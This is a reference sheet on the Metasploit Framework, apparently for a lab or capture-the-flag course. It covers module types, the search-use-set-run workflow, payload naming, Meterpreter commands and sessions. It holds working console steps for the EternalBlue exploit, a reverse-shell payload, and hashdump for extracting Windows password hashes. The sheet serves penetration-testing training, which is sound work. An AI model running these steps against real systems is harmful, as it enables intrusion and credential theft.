# Metasploit — Exploitation Framework

> A practical reference for the Metasploit Framework, the standard tool for finding, configuring, and launching exploits against a target. This sheet covers the core concepts, the search-use-set-run workflow, and getting a Meterpreter session for post-exploitation.

---

## 1. What is Metasploit?

**Metasploit** is an **exploitation framework**: a large, organized collection of ready-made exploits, payloads, and supporting tools, wrapped in a console that makes them easy to configure and launch.

Instead of writing an exploit from scratch, you search Metasploit's database for a module matching the vulnerability you found (usually by CVE), point it at your target, choose what you want to happen on success, and run it.

Where **Nessus finds** the vulnerability, **Metasploit exploits** it. It is the tool that turns a known weakness into actual access. It comes preinstalled on Kali.

---

## 2. Core Concepts

A handful of terms make up almost everything you do in Metasploit.

| Term         | What it is                                                       |
| ------------ | --------------------------------------------------------------- |
| **Module**   | Any single tool in Metasploit (an exploit, scanner, etc.)       |
| **Exploit**  | Code that takes advantage of a specific vulnerability           |
| **Payload**  | What runs on the target *after* the exploit succeeds            |
| **Listener** | Waits on your machine for the target to connect back            |
| **Session**  | An active connection to a compromised target                    |
| **Meterpreter** | A powerful payload giving an interactive post-exploit shell  |

The mental model: **the exploit gets you in, the payload is what you get once you are in.** For example, the exploit might trigger an SMB flaw, and the payload might open a Meterpreter shell.

---

## 3. Module Types

Metasploit organizes its modules into categories. The main ones:

| Type          | Purpose                                              |
| ------------- | ---------------------------------------------------- |
| **exploit**   | Take advantage of a vulnerability                    |
| **payload**   | Code delivered and run on the target                 |
| **auxiliary** | Scanners, fuzzers, and tools that do not exploit     |
| **post**      | Post-exploitation tasks (run after you have access)  |
| **encoder**   | Obfuscate payloads to evade detection                |
| **nop**       | Padding to help payloads run reliably                |

Most of your work lives in **exploit**, **payload**, and later **post** modules. **Auxiliary** is handy for scanning (for example, an SMB version checker) without launching an attack.

---

## 4. Starting msfconsole

`msfconsole` is the main interface, an interactive command console.

```bash
# Start Metasploit's console
msfconsole

# Start quietly, without the banner
msfconsole -q
```

First launch takes a moment to initialize. Once inside, your prompt becomes `msf6 >` and you can start searching for modules.

> Optional but recommended: Metasploit works best with its database connected (for storing hosts and results). On Kali you can set it up with `sudo msfdb init` before launching. Not required for basic use.

---

## 5. The Core Workflow

Almost every Metasploit exploit follows the same five steps. Learn this rhythm and the tool becomes predictable.

```markdown
1. SEARCH  → find a module matching your vulnerability
2. USE     → select that module
3. SET     → configure its options (target, payload, your IP)
4. CHECK   → (optional) verify the target looks vulnerable
5. RUN     → launch it
```

In practice:

```bash
# 1. Search by CVE, name, or keyword
search ms17-010

# 2. Select the module (paste its full path or use its index number)
use exploit/windows/smb/ms17_010_eternalblue

# 3. See what needs configuring
show options

# 4. Set the required options
set RHOSTS 192.168.64.2
set LHOST 192.168.64.3

# 5. (optional) check if target appears vulnerable
check

# 6. Launch
run
# (or the alias)
exploit
```

If it succeeds, you land in a **session**, often a Meterpreter prompt.

---

## 6. Payloads: Staged vs Stageless

When you pick a payload, you will see two naming styles. The difference matters when things fail silently.

| Style         | Example naming                              | How it works                                    |
| ------------- | ------------------------------------------- | ----------------------------------------------- |
| **Staged**    | `windows/x64/meterpreter/reverse_tcp`       | Sends a small stub first, which pulls the rest  |
| **Stageless** | `windows/x64/meterpreter_reverse_tcp`       | Sends the whole payload in one piece            |

Read the slashes:

- **Staged** uses slashes between `meterpreter` and `reverse_tcp` (`meterpreter/reverse_tcp`) — sent in two parts
- **Stageless** joins them with an underscore (`meterpreter_reverse_tcp`) — sent all at once

Staged is smaller and more flexible but needs a stable connection to pull the second stage. Stageless is bigger but more reliable over flaky links. If a staged payload connects then dies, trying the stageless version is a common fix.

A module usually sets a sensible default payload, so you often do not choose manually. To change it: `set PAYLOAD <path>`.

---

## 7. RHOSTS, LHOST, and Options

The options that trip people up most:

| Option       | Meaning                                                | Set it to           |
| ------------ | ------------------------------------------------------ | ------------------- |
| **RHOSTS**   | Remote host — the target                               | The target's IP     |
| **RPORT**    | Remote port — the target's service port                | Often preset        |
| **LHOST**    | Local host — *your* IP the target connects back to     | Your Kali IP        |
| **LPORT**    | Local port — the port your listener waits on           | Often preset (4444) |
| **PAYLOAD**  | What runs on success                                   | Usually a default   |

The classic mistake: **LHOST set wrong.** For a reverse connection, the target connects back to *you*, so LHOST must be **your Kali IP**, the one on the same network as the target. If your IP changed (after a network switch or reconnect), an old LHOST means the target tries to call back to nowhere and the exploit fails silently.

```bash
# See current settings anytime
show options

# Clear a wrongly set option
unset LHOST
```

---

## 8. Meterpreter Basics

**Meterpreter** is Metasploit's flagship payload, an in-memory shell with far more power than a plain command prompt. Once you have a Meterpreter session, useful commands:

| Command        | What it does                                    |
| -------------- | ----------------------------------------------- |
| `sysinfo`      | Show target OS and system info                  |
| `getuid`       | Show which user you are running as              |
| `hashdump`     | Dump password hashes from the SAM database      |
| `shell`        | Drop into a native OS command shell             |
| `pwd` / `cd` / `ls` | Navigate the target's filesystem           |
| `download <file>` | Pull a file from target to your machine      |
| `upload <file>`   | Push a file from your machine to target      |
| `search -f flag.txt` | Search the filesystem for a file          |
| `getsystem`    | Attempt privilege escalation to SYSTEM          |
| `background`   | Send the session to the background (keep it alive) |

For a target assessment, the key one is **`hashdump`**: it extracts the Windows password hashes (user and administrator) from the SAM, which you then crack offline with John or Hashcat.

```bash
# Typical post-exploitation on a Windows target
sysinfo
getuid
hashdump        # copy these hashes out for cracking
search -f *.txt # hunt for the flag
```

---

## 9. Sessions

A **session** is a live connection to a compromised host. You can hold several at once.

| Command           | What it does                              |
| ----------------- | ----------------------------------------- |
| `sessions`        | List all active sessions                  |
| `sessions -i 1`   | Interact with session number 1            |
| `background`      | Leave the current session running, return to msf |
| `sessions -k 1`   | Kill session 1                            |

The pattern: `background` a Meterpreter session to run more Metasploit commands, then `sessions -i <id>` to jump back into it. Sessions survive in the background until you kill them or the connection drops.

---

## 10. Where Metasploit Fits

Metasploit is the **exploitation** stage of the assessment, and it carries you into **post-exploitation** too.

```markdown
1. nmap        → discover host, ports, service versions
2. Nessus      → find known vulnerabilities (CVE + CVSS)
3. NVD         → research the flagged CVE
4. METASPLOIT  → exploit it, get a session (Meterpreter)
5. hashdump    → extract password hashes
6. John/Hashcat→ crack the hashes offline
```

Metasploit is where all the earlier recon pays off: you feed it the CVE that Nessus flagged and NVD explained, it gives you access, and its post-exploitation tools (`hashdump`, `search`) hand you the material for the final cracking and flag-hunting steps.

---

## 11. Command Quick Reference

| Command                          | What it does                          |
| -------------------------------- | ------------------------------------- |
| `msfconsole -q`                  | Start the console (quietly)           |
| `search <term>`                  | Find modules by CVE, name, or keyword |
| `use <module>`                   | Select a module                       |
| `show options`                   | List a module's settings              |
| `set RHOSTS <ip>`                | Set the target IP                     |
| `set LHOST <ip>`                 | Set your callback IP                  |
| `set PAYLOAD <path>`             | Choose the payload                    |
| `check`                          | Test if the target looks vulnerable   |
| `run` / `exploit`                | Launch the exploit                    |
| `sessions`                       | List active sessions                  |
| `sessions -i <id>`               | Interact with a session               |
| `background`                     | Background the current session        |

| Concept          | One-line meaning                                     |
| ---------------- | ---------------------------------------------------- |
| **Module**       | Any single tool in Metasploit                        |
| **Exploit**      | Code that abuses a specific vulnerability            |
| **Payload**      | What runs on the target after the exploit works      |
| **Meterpreter**  | Powerful in-memory post-exploitation shell           |
| **Session**      | A live connection to a compromised target            |
| **RHOSTS**       | The target's IP                                      |
| **LHOST**        | Your IP the target connects back to                  |
| **Staged**       | Payload sent in two parts (`meterpreter/reverse_tcp`)|
| **Stageless**    | Payload sent all at once (`meterpreter_reverse_tcp`) |
| **hashdump**     | Meterpreter command to dump SAM password hashes      |
